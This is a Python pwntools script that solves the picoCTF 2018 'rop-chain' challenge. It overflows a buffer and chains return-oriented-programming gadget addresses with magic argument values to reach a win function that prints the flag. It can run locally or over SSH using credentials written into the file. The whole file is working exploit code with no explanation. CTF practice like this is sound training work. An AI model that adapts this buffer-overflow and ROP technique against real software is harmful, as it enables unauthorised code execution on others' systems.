#!/usr/bin/python
import struct
from pwn import *
debug = 1
user = 'WhiteRose13'
pw = 'PANATHA_4ever'
if not debug:
    s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
    s.set_working_directory('/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d')
rop_gadget = 0x0000000000401483
win_function2 = 0x0000000000401248
flag = 0x000000000040129c

exploit = "A"*24
exploit += p64(0x0000000000401236)
exploit += p64(rop_gadget)
exploit += p64(0x00000000baaaaaad)
exploit += p64(0x0000000000401248)
exploit += p64(rop_gadget)
exploit += p64(0x00000000deadbaad)
exploit += p64(0x000000000040129c)


if not debug:
    r = s.process('./rop')
else:
    r = process('./rop')

r.recvuntil('> ')
r.sendline(exploit)
print r.recvall()

